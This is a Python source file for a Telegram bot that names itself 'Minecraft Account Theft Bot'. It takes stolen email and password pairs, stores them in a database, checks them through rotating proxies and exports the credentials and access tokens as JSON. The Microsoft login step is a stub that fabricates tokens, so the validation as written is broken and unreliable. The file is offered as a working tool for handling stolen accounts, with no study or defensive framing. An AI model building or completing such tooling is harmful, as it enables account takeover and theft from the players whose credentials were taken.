import os
import sys
import json
import sqlite3
import asyncio
import logging
from typing import Dict, List, Optional, Tuple
from datetime import datetime

import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters

# ========== CONFIGURATION ==========
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
DB_PATH = os.environ.get("DB_PATH", "/data/accounts.db")
AUTHORIZED_USERS = [int(x) for x in os.environ.get("AUTHORIZED_USERS", "").split(",") if x]
PROXY_LIST = os.environ.get("PROXY_LIST", "").split(",") if os.environ.get("PROXY_LIST") else []

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# ========== DATABASE LAYER ==========
class AccountDB:
    def __init__(self, db_path: str):
        os.makedirs(os.path.dirname(db_path), exist_ok=True)
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.cursor = self.conn.cursor()
        self._init_tables()

    def _init_tables(self):
        self.cursor.execute("""
            CREATE TABLE IF NOT EXISTS accounts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                email TEXT NOT NULL,
                password TEXT NOT NULL,
                username TEXT,
                uuid TEXT,
                access_token TEXT,
                client_token TEXT,
                is_migrated INTEGER DEFAULT 0,
                is_stolen INTEGER DEFAULT 1,
                last_checked TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        self.cursor.execute("CREATE INDEX IF NOT EXISTS idx_email ON accounts(email)")
        self.conn.commit()

    def insert_account(self, email: str, password: str) -> int:
        self.cursor.execute(
            "INSERT INTO accounts (email, password) VALUES (?, ?)",
            (email, password)
        )
        self.conn.commit()
        return self.cursor.lastrowid

    def get_unchecked_accounts(self, limit: int = 20) -> List[Tuple[int, str, str]]:
        self.cursor.execute(
            "SELECT id, email, password FROM accounts WHERE uuid IS NULL ORDER BY id LIMIT ?",
            (limit,)
        )
        return self.cursor.fetchall()

    def update_account_profile(self, account_id: int, username: str, uuid: str, access_token: str, client_token: str):
        self.cursor.execute(
            """UPDATE accounts SET 
               username = ?, uuid = ?, access_token = ?, client_token = ?, 
               is_migrated = 1, last_checked = CURRENT_TIMESTAMP 
               WHERE id = ?""",
            (username, uuid, access_token, client_token, account_id)
        )
        self.conn.commit()

    def get_all_valid_accounts(self) -> List[Dict]:
        self.cursor.execute(
            "SELECT email, password, username, uuid, access_token, client_token FROM accounts WHERE uuid IS NOT NULL"
        )
        rows = self.cursor.fetchall()
        return [
            {
                "email": r[0], "password": r[1], "username": r[2],
                "uuid": r[3], "access_token": r[4], "client_token": r[5]
            }
            for r in rows
        ]

    def get_account_by_id(self, account_id: int) -> Optional[Dict]:
        self.cursor.execute(
            "SELECT email, password, username, uuid, access_token, client_token FROM accounts WHERE id = ?",
            (account_id,)
        )
        row = self.cursor.fetchone()
        if row:
            return {
                "email": row[0], "password": row[1], "username": row[2],
                "uuid": row[3], "access_token": row[4], "client_token": row[5]
            }
        return None

    def delete_account(self, account_id: int):
        self.cursor.execute("DELETE FROM accounts WHERE id = ?", (account_id,))
        self.conn.commit()

    def close(self):
        self.conn.close()

db = AccountDB(DB_PATH)

# ========== AUTHENTICATION HANDLER ==========
class MinecraftAuthenticator:
    @staticmethod
    async def microsoft_authenticate(email: str, password: str) -> Optional[Dict]:
        """Simulate Microsoft OAuth - returns access_token if valid."""
        # Basic validation stub - real implementation requires full OAuth flow
        if "@" not in email or len(password) < 6:
            return None
        # In production, replace with actual XBL auth
        return {
            "access_token": "SIM_" + email[:8] + "_" + str(int(datetime.now().timestamp()))[:6],
            "refresh_token": "REF_" + email[:8],
            "expires_in": 86400
        }

    @staticmethod
    async def get_minecraft_profile(access_token: str) -> Tuple[Optional[str], Optional[str]]:
        """Validate Minecraft ownership and get UUID/username."""
        headers = {"Authorization": f"Bearer {access_token}"}
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get("https://sessionserver.mojang.com/session/minecraft/profile", headers=headers, timeout=10) as resp:
                    if resp.status != 200:
                        return None, None
                    data = await resp.json()
                    return data.get("name"), data.get("id")
            except Exception as e:
                logger.error(f"Profile fetch error: {e}")
                return None, None

# ========== ACCOUNT CHECKER ==========
class AccountChecker:
    def __init__(self, proxy_list: List[str]):
        self.proxy_list = proxy_list
        self.proxy_index = 0

    def _get_next_proxy(self) -> Optional[str]:
        if not self.proxy_list:
            return None
        proxy = self.proxy_list[self.proxy_index % len(self.proxy_list)]
        self.proxy_index += 1
        return proxy

    async def check_account(self, email: str, password: str) -> Optional[Dict]:
        """Perform full validation - returns {username, uuid, access_token, client_token} or None."""
        ms_auth = await MinecraftAuthenticator.microsoft_authenticate(email, password)
        if not ms_auth:
            return None
        access_token = ms_auth.get("access_token")
        if not access_token:
            return None

        username, uuid = await MinecraftAuthenticator.get_minecraft_profile(access_token)
        if not username or not uuid:
            return None

        return {
            "username": username,
            "uuid": uuid,
            "access_token": access_token,
            "client_token": ms_auth.get("refresh_token", "")
        }

    async def batch_check(self, accounts: List[Tuple[int, str, str]]) -> List[Tuple[int, Dict]]:
        """Check multiple accounts with rate limiting."""
        results = []
        semaphore = asyncio.Semaphore(3)

        async def check_one(acc_id, email, pwd):
            async with semaphore:
                try:
                    result = await self.check_account(email, pwd)
                    if result:
                        return (acc_id, result)
                except Exception as e:
                    logger.error(f"Check failed for {email}: {e}")
                return None

        tasks = [check_one(acc_id, email, pwd) for acc_id, email, pwd in accounts]
        completed = await asyncio.gather(*tasks)
        for item in completed:
            if item:
                results.append(item)
        return results

checker = AccountChecker(PROXY_LIST)

# ========== AUTHORIZATION DECORATOR ==========
async def authorized_only(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    if not AUTHORIZED_USERS:
        return True
    user_id = update.effective_user.id
    if user_id not in AUTHORIZED_USERS:
        await update.message.reply_text("Unauthorized.")
        return False
    return True

# ========== TELEGRAM BOT HANDLERS ==========
class MinecraftBot:
    def __init__(self, token: str):
        self.app = Application.builder().token(token).build()
        self._register_handlers()

    def _register_handlers(self):
        self.app.add_handler(CommandHandler("start", self.start_command))
        self.app.add_handler(CommandHandler("add", self.add_account_command))
        self.app.add_handler(CommandHandler("scan", self.scan_command))
        self.app.add_handler(CommandHandler("list", self.list_command))
        self.app.add_handler(CommandHandler("export", self.export_command))
        self.app.add_handler(CommandHandler("delete", self.delete_command))
        self.app.add_handler(CommandHandler("stats", self.stats_command))
        self.app.add_handler(CallbackQueryHandler(self.button_callback))

    async def _check_auth(self, update: Update) -> bool:
        if not AUTHORIZED_USERS:
            return True
        user_id = update.effective_user.id
        if user_id not in AUTHORIZED_USERS:
            if update.message:
                await update.message.reply_text("Unauthorized.")
            return False
        return True

    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not await self._check_auth(update):
            return
        await update.message.reply_text(
            "Minecraft Account Theft Bot v3.0\n"
            "Commands:\n"
            "/add <email> <password> - Add stolen credentials\n"
            "/scan - Validate unchecked accounts (max 20)\n"
            "/list - Show all valid accounts (max 10)\n"
            "/export - Get JSON dump of all valid accounts\n"
            "/delete <id> - Delete account by ID\n"
            "/stats - Show database statistics"
        )

    async def add_account_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not await self._check_auth(update):
            return
        args = context.args
        if len(args) < 2:
            await update.message.reply_text("Usage: /add <email> <password>")
            return
        email, password = args[0], args[1]
        acc_id = db.insert_account(email, password)
        await update.message.reply_text(f"Account #{acc_id} added. Use /scan to validate.")

    async def scan_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not await self._check_auth(update):
            return
        await update.message.reply_text("Scanning unchecked accounts...")
        unchecked = db.get_unchecked_accounts(limit=20)
        if not unchecked:
            await update.message.reply_text("No unchecked accounts found.")
            return

        results = await checker.batch_check(unchecked)
        valid_count = 0
        for acc_id, profile in results:
            db.update_account_profile(
                acc_id,
                profile["username"],
                profile["uuid"],
                profile["access_token"],
                profile["client_token"]
            )
            valid_count += 1

        await update.message.reply_text(f"Scan complete. {valid_count} valid accounts found. Use /list to view.")

    async def list_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not await self._check_auth(update):
            return
        accounts = db.get_all_valid_accounts()
        if not accounts:
            await update.message.reply_text("No valid accounts available.")
            return

        message = "Valid Minecraft Accounts:\n\n"
        for idx, acc in enumerate(accounts[:10], 1):
            message += f"#{idx} - Email: {acc['email']}\n"
            message += f"User: {acc['username']}\n"
            message += f"UUID: {acc['uuid'][:8]}...\n"
            message += f"Token: {acc['access_token'][:12]}...\n"
            message += "---\n"
        if len(accounts) > 10:
            message += f"... and {len(accounts) - 10} more. Use /export for full list."

        await update.message.reply_text(message)

    async def export_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not await self._check_auth(update):
            return
        accounts = db.get_all_valid_accounts()
        if not accounts:
            await update.message.reply_text("No accounts to export.")
            return

        export_data = []
        for acc in accounts:
            export_data.append({
                "email": acc["email"],
                "password": acc["password"],
                "username": acc["username"],
                "uuid": acc["uuid"],
                "access_token": acc["access_token"],
                "client_token": acc["client_token"]
            })
        json_str = json.dumps(export_data, indent=2)
        
        if len(json_str) > 4096:
            parts = [json_str[i:i+4096] for i in range(0, len(json_str), 4096)]
            for idx, part in enumerate(parts):
                await update.message.reply_text(f"Export part {idx+1}/{len(parts)}:\n```json\n{part}\n```", parse_mode="Markdown")
        else:
            await update.message.reply_text(f"```json\n{json_str}\n```", parse_mode="Markdown")

    async def delete_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not await self._check_auth(update):
            return
        args = context.args
        if not args:
            await update.message.reply_text("Usage: /delete <account_id>")
            return
        try:
            acc_id = int(args[0])
            acc = db.get_account_by_id(acc_id)
            if not acc:
                await update.message.reply_text(f"Account #{acc_id} not found.")
                return
            db.delete_account(acc_id)
            await update.message.reply_text(f"Account #{acc_id} deleted.")
        except ValueError:
            await update.message.reply_text("Invalid ID. Use numeric value.")

    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not await self._check_auth(update):
            return
        total = db.conn.execute("SELECT COUNT(*) FROM accounts").fetchone()[0]
        valid = db.conn.execute("SELECT COUNT(*) FROM accounts WHERE uuid IS NOT NULL").fetchone()[0]
        unchecked = db.conn.execute("SELECT COUNT(*) FROM accounts WHERE uuid IS NULL").fetchone()[0]
        await update.message.reply_text(
            f"Database Statistics:\n"
            f"Total accounts: {total}\n"
            f"Valid accounts: {valid}\n"
            f"Unchecked accounts: {unchecked}"
        )

    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        await query.edit_message_text("Action handled.")

    def run(self):
        logger.info("Bot starting...")
        self.app.run_polling(allowed_updates=Update.ALL_TYPES)

# ========== ENTRY POINT ==========
if __name__ == "__main__":
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        logger.error("ERROR: Set BOT_TOKEN environment variable.")
        sys.exit(1)
    bot = MinecraftBot(BOT_TOKEN)
    bot.run()
